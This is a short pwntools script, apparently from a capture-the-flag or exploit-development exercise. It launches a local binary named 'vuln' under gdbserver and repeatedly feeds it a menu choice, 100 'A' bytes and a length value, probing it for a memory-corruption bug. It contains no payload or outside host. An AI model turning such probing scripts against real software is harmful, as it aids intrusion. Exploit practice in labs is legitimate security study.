from pwn import *
context.log_level = 'debug'

p = process(['gdbserver', '--once', 'localhost:1234', 'vuln'])
pause()

p.recvuntil(b"program")
for i in range(11):
    p.sendline(b"1")
    p.sendlineafter(b"data:", b"A"*100)
    p.sendlineafter(b"data:", b"100")
    p.recvline()